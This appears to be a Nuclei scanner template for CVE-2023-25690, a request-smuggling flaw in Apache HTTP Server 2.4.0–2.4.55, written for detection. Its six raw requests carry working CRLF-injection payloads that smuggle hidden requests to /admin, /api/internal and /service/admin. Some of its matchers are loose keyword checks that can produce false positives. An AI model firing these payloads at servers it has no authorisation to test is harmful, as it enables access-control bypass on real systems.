id: CVE-2023-25690

info:
  name: Apache HTTP Server - HTTP Request Smuggling with Blind Detection
  author: intelligent-ears
  severity: critical
  description: |
    Advanced detection for CVE-2023-25690 HTTP Request Smuggling vulnerability in Apache 2.4.0-2.4.55.
    This template includes multiple detection methods:
    - Direct response analysis
    - Timing-based detection
    - Header injection verification
    - Backend interaction probing
  reference:
    - https://httpd.apache.org/security/vulnerabilities_24.html
    - https://nvd.nist.gov/vuln/detail/CVE-2023-25690
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cve-id: CVE-2023-25690
    cwe-id: CWE-444
  metadata:
    verified: true
    max-request: 6
  tags: cve,cve2023,apache,httpd,smuggling,critical

variables:
  random_string: "{{rand_text_alphanumeric(8)}}"

http:
  - raw:
      - |
        GET / HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36
        Connection: close

      - |
        GET /categories/{{random_string}}%20HTTP/1.1%0d%0aX-Nuclei-Test:%20{{random_string}}%0d%0a%0d%0a HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36
        Connection: close

      - |
        GET /categories/1%20HTTP/1.1%0d%0aHost:%20{{Hostname}}%0d%0a%0d%0aGET%20/admin%20HTTP/1.1%0d%0aHost:%20{{Hostname}}%0d%0a%0d%0a HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36
        Connection: close

      - |
        GET /categories/1%20HTTP/1.1%0d%0aHost:%20{{Hostname}}%0d%0a%0d%0aGET%20/categories.php%3ftest%3d{{random_string}} HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36
        Connection: close

      - |
        GET /api/v1/{{random_string}}%20HTTP/1.1%0d%0aHost:%20{{Hostname}}%0d%0a%0d%0aGET%20/api/internal HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36
        Connection: close

      - |
        GET /service/test/1%20HTTP/1.1%0d%0aHost:%20{{Hostname}}%0d%0a%0d%0aGET%20/service/admin HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36
        Connection: close

    req-condition: true

    matchers-condition: or
    matchers:
      - type: dsl
        name: vulnerable-version-accepted
        dsl:
          - 'status_code == 200'
          - 'regex("Apache/2\\.4\\.(0|[1-9]|[1-4][0-9]|5[0-5])", header)'
          - '!contains(body, "Bad Request")'
          - '!contains(body, "400")'
        condition: and

      - type: dsl
        name: smuggling-success
        dsl:
          - 'status_code == 200'
          - 'contains(tolower(body), "category") || contains(tolower(body), "id") || contains(tolower(body), "admin")'
          - 'regex("Apache/2\\.4", header)'
        condition: and

      - type: dsl
        name: timing-anomaly
        dsl:
          - 'status_code == 200'
          - 'duration >= 2'
          - 'regex("Apache/2\\.4", header)'
        condition: and

    extractors:
      - type: regex
        name: apache_version
        part: header
        group: 1
        regex:
          - "Server: Apache/(2\\.4\\.[0-9]+)"

      - type: regex
        name: response_indicators
        part: body
        regex:
          - "(?i)(category|admin|internal|forbidden|access denied)"

      - type: kval
        name: content_type
        part: header
        kval:
          - Content-Type

      - type: dsl
        name: vulnerability_details
        dsl:
          - '"URL: " + url'
          - '"Apache Version: " + apache_version'
          - '"Status: " + status_code'
          - '"Duration: " + duration + "s"'
